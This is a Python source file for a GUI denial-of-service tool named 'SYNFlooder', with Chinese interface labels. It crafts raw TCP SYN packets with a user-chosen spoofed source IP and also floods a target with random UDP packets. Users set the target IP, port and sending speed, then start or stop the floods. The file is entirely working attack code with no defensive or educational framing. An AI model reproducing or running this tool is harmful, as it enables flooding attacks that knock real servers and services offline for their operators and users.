import tkinter as tk
from tkinter import messagebox
import time
import socket
import sys
import threading
import random
import impacket.ImpactPacket
import warnings
import webbrowser

warnings.filterwarnings("ignore")

attack_running = False  # 用于控制攻击状态的全局变量

def disable_widgets():
    target_ip_entry.config(state='disabled')
    local_ip_entry.config(state='disabled')
    port_entry.config(state='disabled')
    source_port_entry.config(state='disabled')
    speed_entry.config(state='disabled')
    syn_button.config(state='disabled')
    udp_button.config(state='disabled')

def enable_widgets():
    target_ip_entry.config(state='normal')
    local_ip_entry.config(state='normal')
    port_entry.config(state='normal')
    source_port_entry.config(state='normal')
    speed_entry.config(state='normal')
    syn_button.config(state='normal')
    udp_button.config(state='normal')

def start_syn_attack():
    global attack_running
    dip = target_ip_entry.get()
    lip = local_ip_entry.get()
    port = int(port_entry.get())
    sport = int(source_port_entry.get())
    speed = int(speed_entry.get())

    if not dip or not lip:
        messagebox.showwarning("输入警告", "目标 IP 和数据包源 IP 均为必填项")
        return

    attack_running = True
    disable_widgets()
    threading.Thread(target=syn_attack, args=(dip, lip, port, sport, speed)).start()

def start_udp_attack():
    global attack_running
    dip = target_ip_entry.get()
    port = int(port_entry.get())
    speed = int(speed_entry.get())

    if not dip:
        messagebox.showwarning("输入警告", "目标 IP 为必填项")
        return

    attack_running = True
    disable_widgets()
    threading.Thread(target=udp_attack, args=(dip, port, speed)).start()

def stop_attack():
    global attack_running
    attack_running = False
    enable_widgets()

def syn_attack(dip, lip, port, sport, speed):
    sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        messagebox.showerror("权限警告", "需要管理员/sudo权限运行此脚本")
        return

    ip = impacket.ImpactPacket.IP()
    tcp = impacket.ImpactPacket.TCP()

    ip.set_ip_src(lip)
    ip.set_ip_dst(dip)
    ip.set_ip_ttl(255)

    tcp.set_th_flags(0b00000010)
    tcp.set_th_sport(sport)
    tcp.set_th_dport(port)
    tcp.set_th_ack(0)
    tcp.set_th_seq(22903)
    tcp.set_th_win(20000)

    while attack_running:
        ip.contains(tcp)
        ip.calculate_checksum()
        try:
            sock.sendto(ip.get_packet(), (dip, port))
            sent += 1
            print(f"已发送 {sent} 个SYN数据包到 {dip} 端口 {port}")
            time.sleep((1000 - speed) / 2000)
        except Exception as e:
            print(f"发送数据包时出错: {e}")
            break
    enable_widgets()

def udp_attack(dip, port, speed):
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    while attack_running:
        sock.sendto(bytes, (dip, port))
        sent += 1
        print(f"已发送 {sent} 个UDP数据包到 {dip} 端口 {port}")
        time.sleep((1000 - speed) / 2000)
    enable_widgets()

root = tk.Tk()
root.title("SYNFlooder")
root.configure(bg='black')

label_font = ("宋体", 10)
button_font = ("宋体", 10)
label_fg = "white"
label_bg = "black"

tk.Label(root, text="目标服务器 IP:", font=label_font, fg=label_fg, bg=label_bg, anchor="w").grid(row=0, column=0, sticky="w")
target_ip_entry = tk.Entry(root)
target_ip_entry.grid(row=0, column=1, sticky="w")

tk.Label(root, text="数据包源 IP:", font=label_font, fg=label_fg, bg=label_bg, anchor="w").grid(row=1, column=0, sticky="w")
local_ip_entry = tk.Entry(root)
local_ip_entry.grid(row=1, column=1, sticky="w")

tk.Label(root, text="目标端口:", font=label_font, fg=label_fg, bg=label_bg, anchor="w").grid(row=2, column=0, sticky="w")
port_entry = tk.Entry(root)
port_entry.grid(row=2, column=1, sticky="w")
port_entry.insert(0, "80")

tk.Label(root, text="源端口:", font=label_font, fg=label_fg, bg=label_bg, anchor="w").grid(row=3, column=0, sticky="w")
source_port_entry = tk.Entry(root)
source_port_entry.grid(row=3, column=1, sticky="w")
source_port_entry.insert(0, "12228")

tk.Label(root, text="发送速度 (1-1000):", font=label_font, fg=label_fg, bg=label_bg, anchor="w").grid(row=4, column=0, sticky="w")
speed_entry = tk.Entry(root)
speed_entry.grid(row=4, column=1, sticky="w")
speed_entry.insert(0, "1000")

syn_button = tk.Button(root, text="开始 SYN 攻击", command=start_syn_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
syn_button.grid(row=5, column=0, pady=5, sticky="w")

udp_button = tk.Button(root, text="开始 UDP 攻击", command=start_udp_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
udp_button.grid(row=5, column=1, pady=5, sticky="w")

stop_button = tk.Button(root, text="停止攻击", command=stop_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
stop_button.grid(row=6, columnspan=2, pady=5)

def open_project_link(event):
    webbrowser.open_new("http://github.com/Gr3yPh/SYNFlooder")

project_link = tk.Label(root, text="http://github.com/Gr3yPh/SYNFlooder", font=label_font, fg=label_fg, bg=label_bg, cursor="hand2", anchor="w")
project_link.grid(row=7, columnspan=2, sticky="w")
project_link.bind("<Button-1>", open_project_link)

author_name = tk.Label(root, text="作者：GR3YPH_4NTOM | 版本：v1.0", font=label_font, fg=label_fg, bg=label_bg, anchor="w")
author_name.grid(row=8, columnspan=2, sticky="w")

root.mainloop()
